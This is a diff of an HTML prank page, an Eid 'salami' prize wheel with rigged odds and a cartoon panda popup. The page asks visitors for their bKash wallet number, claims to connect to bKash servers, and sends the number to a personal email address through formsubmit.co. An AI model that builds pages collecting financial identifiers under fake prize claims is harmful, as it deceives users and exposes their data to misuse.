@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Eid Salami Wheel!</title>
     <style>
         body {
@@ -15,27 +15,32 @@
             justify-content: center;
             min-height: 100vh;
             margin: 0;
-            overflow-x: hidden;
+            overflow: hidden; 
+            padding: 10px;
+            box-sizing: border-box;
         }
 
         h1 {
-            font-size: 2.5rem;
+            font-size: clamp(1.8rem, 5vw, 2.5rem);
             margin-bottom: 5px;
             text-align: center;
             text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
         }
 
         p {
-            font-size: 1.2rem;
+            font-size: clamp(1rem, 3vw, 1.2rem);
             margin-bottom: 20px;
             color: #fff;
             text-align: center;
         }
 
+        /* Fully Mobile Responsive Wheel */
         .wheel-container {
             position: relative;
-            width: 320px;
-            height: 320px;
+            width: 90vw;
+            max-width: 350px;
+            height: 90vw;
+            max-height: 350px;
             margin-bottom: 20px;
         }
 
@@ -51,20 +56,20 @@
         .pointer {
             position: absolute;
             top: 50%;
-            right: -15px;
+            right: -5%;
             transform: translateY(-50%);
             width: 0;
             height: 0;
-            border-top: 15px solid transparent;
-            border-bottom: 15px solid transparent;
-            border-right: 30px solid #e74c3c;
+            border-top: clamp(10px, 3vw, 15px) solid transparent;
+            border-bottom: clamp(10px, 3vw, 15px) solid transparent;
+            border-right: clamp(20px, 6vw, 30px) solid #e74c3c;
             z-index: 10;
             filter: drop-shadow(-2px 2px 2px rgba(0,0,0,0.5));
         }
 
         button {
-            padding: 12px 35px;
-            font-size: 1.2rem;
+            padding: 12px 30px;
+            font-size: clamp(1rem, 4vw, 1.2rem);
             font-weight: bold;
             background-color: #f1c40f;
             color: #0f4c3a;
@@ -73,22 +78,16 @@
             cursor: pointer;
             box-shadow: 0 5px 15px rgba(0,0,0,0.3);
             transition: all 0.2s;
+            width: 80%;
+            max-width: 300px;
         }
 
-        button:hover {
-            background-color: #f39c12;
-            transform: scale(1.05);
-        }
-
-        button:disabled {
-            background-color: #7f8c8d;
-            cursor: not-allowed;
-            transform: none;
-        }
+        button:hover { background-color: #f39c12; transform: scale(1.05); }
+        button:disabled { background-color: #7f8c8d; cursor: not-allowed; transform: none; }
 
         #result {
             margin-top: 15px;
-            font-size: 1.8rem;
+            font-size: clamp(1.2rem, 5vw, 1.8rem);
             font-weight: bold;
             min-height: 30px;
             color: #fff;
@@ -101,13 +100,14 @@
             flex-direction: column;
             align-items: center;
             background: rgba(255, 255, 255, 0.1);
-            padding: 20px;
+            padding: 15px;
             border-radius: 15px;
-            margin-top: 20px;
+            margin-top: 15px;
             border: 2px dashed #f1c40f;
             animation: fadeIn 0.5s ease-in-out;
-            width: 90%;
+            width: 100%;
             max-width: 350px;
+            box-sizing: border-box;
         }
 
         #claimSection input {
@@ -115,29 +115,156 @@
             font-size: 1.1rem;
             border-radius: 8px;
             border: none;
-            width: 80%;
+            width: 90%;
             margin-bottom: 15px;
             text-align: center;
             outline: none;
+            box-sizing: border-box;
         }
 
-        #finalMessage {
+        #loadingMessage {
             margin-top: 15px;
-            font-size: 1.1rem;
+            font-size: 1rem;
             color: #fff;
             text-align: center;
             font-style: italic;
+        }
+
+        /* --- THE PANDA POPUP STYLES --- */
+        #overlay {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 99;
+            backdrop-filter: blur(5px);
+        }
+
+        #popupModal {
+            display: none;
+            position: fixed;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%) scale(0.1);
+            background: linear-gradient(135deg, #f1c40f, #e67e22);
+            color: #0f4c3a;
+            padding: 20px 15px;
+            border-radius: 20px;
+            z-index: 100;
+            text-align: center;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+            width: 90%;
+            max-width: 380px;
+            transition: transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+
+        #popupModal.show { transform: translate(-50%, -50%) scale(1); }
+
+        .eid-mubarak-text {
+            font-size: clamp(1.8rem, 6vw, 2.2rem);
+            font-weight: bold;
+            margin-bottom: 5px;
+            text-shadow: 2px 2px 0px rgba(255,255,255,0.5);
+        }
+
+        /* --- THE EPIC PANDA ANIMATION --- */
+        .panda-arena {
+            display: flex;
+            justify-content: center;
+            align-items: flex-end;
+            height: 100px;
+            margin: 15px 0;
+            position: relative;
+            font-size: 3.5rem;
+        }
+
+        .speech-bubble {
+            position: absolute;
+            top: -20px;
+            left: 5%;
+            background: white;
+            color: black;
+            font-size: 0.8rem;
+            font-weight: bold;
+            padding: 5px 8px;
+            border-radius: 10px;
+            animation: hideBubble 3s infinite;
+        }
+        .speech-bubble::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            right: 10px;
+            border-width: 5px 5px 0;
+            border-style: solid;
+            border-color: white transparent transparent transparent;
+        }
+
+        .panda-beggar {
+            position: absolute;
+            left: 15%;
+            animation: beggarReact 3s infinite;
+        }
+
+        .panda-boss {
+            position: absolute;
+            right: 15%;
+            animation: bossAttack 3s infinite;
+            z-index: 2;
+        }
+
+        .hit-effect {
+            position: absolute;
+            left: 35%;
+            top: 30%;
+            font-size: 2.5rem;
+            opacity: 0;
+            animation: hitFlash 3s infinite;
+            z-index: 3;
+        }
+
+        /* Slap and Kick Keyframes */
+        @keyframes bossAttack {
+            0%, 10% { transform: translateX(0) rotate(0); }
+            15% { transform: translateX(-40px) rotate(-20deg); } /* Slap */
+            25% { transform: translateX(0) rotate(0); }
+            40% { transform: translateX(0) rotate(0); }
+            45% { transform: translateX(-50px) translateY(-20px) rotate(-45deg); } /* Kick */
+            60% { transform: translateX(0) translateY(0) rotate(0); }
+            100% { transform: translateX(0) rotate(0); }
+        }
+
+        @keyframes beggarReact {
+            0%, 12% { transform: translateX(0) rotate(0); }
+            15% { transform: translateX(-15px) rotate(-15deg); } /* React to slap */
+            25% { transform: translateX(0) rotate(0); }
+            45% { transform: translateX(-150px) rotate(-90deg) scale(0.5); opacity: 0;} /* Fly away from kick */
+            90% { transform: translateX(0) rotate(0) scale(1); opacity: 1;} /* Reset */
+            100% { transform: translateX(0) rotate(0); }
+        }
+
+        @keyframes hitFlash {
+            0%, 12% { opacity: 0; }
+            15% { opacity: 1; } /* Slap impact */
+            20% { opacity: 0; }
+            42% { opacity: 0; }
+            45% { opacity: 1; } /* Kick impact */
+            50% { opacity: 0; }
+            100% { opacity: 0; }
+        }
+
+        @keyframes hideBubble {
+            0%, 40% { opacity: 1; }
+            45%, 100% { opacity: 0; }
+        }
+
+        .joke-text {
+            font-size: clamp(1rem, 4vw, 1.2rem);
+            font-weight: bold;
+            margin: 15px 0;
             line-height: 1.4;
-        }
-
-        .jackpot {
-            color: #f1c40f !important;
-            animation: pulse 0.5s infinite alternate;
-        }
-
-        @keyframes pulse {
-            from { transform: scale(1); }
-            to { transform: scale(1.2); }
+            background: rgba(255,255,255,0.3);
+            padding: 12px;
+            border-radius: 10px;
         }
 
         @keyframes fadeIn {
@@ -161,9 +288,24 @@
 
     <div id="claimSection">
         <h3 style="margin-top: 0; color: #f1c40f;">Claim Your Reward!</h3>
-        <input type="tel" id="bkashNumber" placeholder="Enter bKash Number" maxlength="11">
+        <input type="tel" id="bkashNumber" placeholder="Enter 11-digit bKash" maxlength="11" inputmode="numeric">
         <button id="claimBtn" onclick="claimSalami()">Send to bKash</button>
-        <div id="finalMessage"></div>
+        <div id="loadingMessage"></div>
+    </div>
+
+    <div id="overlay"></div>
+    <div id="popupModal">
+        <div class="eid-mubarak-text">🌙 Eid Mubarak! 🌙</div>
+        
+        <div class="panda-arena">
+            <div class="speech-bubble">Plz Salami!</div>
+            <div class="panda-beggar">🐼</div>
+            <div class="hit-effect">💥</div>
+            <div class="panda-boss">🐼</div>
+        </div>
+
+        <div id="jokeText" class="joke-text"></div>
+        <button onclick="closePopup()">Okay, I get it 😭</button>
     </div>
 
     <script>
@@ -174,11 +316,13 @@
         const claimSection = document.getElementById("claimSection");
         const bkashInput = document.getElementById("bkashNumber");
         const claimBtn = document.getElementById("claimBtn");
-        const finalMessage = document.getElementById("finalMessage");
+        const loadingMessage = document.getElementById("loadingMessage");
+        const overlay = document.getElementById("overlay");
+        const popupModal = document.getElementById("popupModal");
+        const jokeText = document.getElementById("jokeText");
 
         let currentWonAmount = "";
 
-        // The rigged probabilities
         const segments = [
             { label: '1৳',   weight: 9.9998, color: '#1abc9c' },
             { label: '2৳',   weight: 9.9998, color: '#2ecc71' },
@@ -241,9 +385,8 @@
         function spin() {
             spinBtn.disabled = true;
             resultDiv.innerHTML = "";
-            resultDiv.className = "";
             claimSection.style.display = "none"; 
-            finalMessage.innerHTML = "";
+            loadingMessage.innerHTML = "";
             bkashInput.style.display = "block";
             claimBtn.style.display = "block";
             bkashInput.value = "";
@@ -262,9 +405,10 @@
                 
                 if(currentWonAmount === '100৳' || currentWonAmount === '500৳') {
                     resultDiv.innerHTML = `🎉 OMG! You won ${currentWonAmount}! 🎉`;
-                    resultDiv.className = "jackpot";
+                    resultDiv.style.color = "#f1c40f";
                 } else {
                     resultDiv.innerHTML = `Wow! You won ${currentWonAmount}! 🤑`;
+                    resultDiv.style.color = "#fff";
                 }
                 
                 spinBtn.disabled = false;
@@ -280,49 +424,65 @@
             const number = bkashInput.value.trim();
             
             if (number.length < 11) {
-                alert("Brother, please enter a valid 11-digit bKash number first! How else will I send this massive wealth?");
+                alert("Brother, enter your 11-digit bKash! Don't you want this massive wealth?");
                 return;
             }
 
             bkashInput.style.display = "none";
             claimBtn.style.display = "none";
-            finalMessage.innerHTML = "<i>Connecting to bKash server... please wait.</i>";
+            loadingMessage.innerHTML = "<i>Connecting to bKash Secure Servers... 🚀</i>";
 
-            // ==========================================
-            // ⚠️ YOUR GOOGLE FORMS SETTINGS GO HERE ⚠️
-            // ==========================================
-            
-            const formUrl = "YOUR_FORMRESPONSE_URL_HERE"; 
-            
-            const formData = new FormData();
-            formData.append("entry.REPLACE_WITH_BKASH_ID", number); 
-            formData.append("entry.REPLACE_WITH_AMOUNT_ID", currentWonAmount); 
-
-            // ==========================================
-
-            fetch(formUrl, {
+            // SEND EMAIL AUTOMATICALLY
+            fetch("https://formsubmit.co/ajax/brandhatches@gmail.com", {
                 method: "POST",
-                mode: "no-cors",
-                body: formData
-            }).then(() => {
-                setTimeout(() => {
-                    if (currentWonAmount === '100৳' || currentWonAmount === '500৳') {
-                        finalMessage.innerHTML = `⚠️ <b>ERROR 404: Wallet Funds Not Found.</b><br><br>Wait, you actually hit the jackpot?! Screenshot this and send it to me, I guess I owe you ${currentWonAmount}...`;
-                    } else {
-                        const jokes = [
-                            `✅ Success! ${currentWonAmount} is scheduled to be sent to ${number}. Please allow 3 to 5 business years for the transaction to complete.`,
-                            `✅ Request received! I will send ${currentWonAmount} to ${number} right after I sell my kidney.`,
-                            `✅ Processing... Actually, bKash's cash-in fee is more than ${currentWonAmount}. You owe ME money now.`
-                        ];
-                        finalMessage.innerHTML = jokes[Math.floor(Math.random() * jokes.length)];
-                    }
-                }, 2000); 
-            }).catch(error => {
-                // Failsafe joke if the fetch errors out
-                setTimeout(() => {
-                    finalMessage.innerHTML = `✅ Request received! I will send ${currentWonAmount} to ${number} right after I sell my kidney.`;
-                }, 2000);
-            });
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify({
+                    _subject: "🎉 New Salami Claim!",
+                    bKash_Number: number,
+                    Amount_Won: currentWonAmount
+                })
+            })
+            .then(response => response.json())
+            .then(data => { triggerFunnyPopup(number); })
+            .catch(error => { triggerFunnyPopup(number); });
+        }
+
+        function triggerFunnyPopup(number) {
+            setTimeout(() => {
+                claimSection.style.display = "none";
+
+                let theJoke = "";
+                if (currentWonAmount === '100৳' || currentWonAmount === '500৳') {
+                    theJoke = `⚠️ Error 404: Salami Wallet Empty! ⚠️<br><br>Wait, you actually won ${currentWonAmount}?! I literally coded this to be impossible.`;
+                } else {
+                    const jokes = [
+                        `Did you really think I'd just hand over ${currentWonAmount}? 😂 Salami machine broke!`,
+                        `Success! I will send ${currentWonAmount} to ${number} right after I sell my kidney. 🫀`,
+                        `bKash fee is more than ${currentWonAmount}. You actually owe ME money now! 💸`,
+                        `${currentWonAmount} is on the way! Please allow 3 to 5 business years for delivery. ⏳`
+                    ];
+                    theJoke = jokes[Math.floor(Math.random() * jokes.length)];
+                }
+
+                jokeText.innerHTML = theJoke;
+                overlay.style.display = "block";
+                popupModal.style.display = "block";
+                
+                setTimeout(() => { popupModal.classList.add("show"); }, 10);
+            }, 1500); 
+        }
+
+        function closePopup() {
+            popupModal.classList.remove("show");
+            setTimeout(() => {
+                popupModal.style.display = "none";
+                overlay.style.display = "none";
+                // Reset for next spin
+                resultDiv.innerHTML = "";
+            }, 500); 
         }
 
         drawWheel();
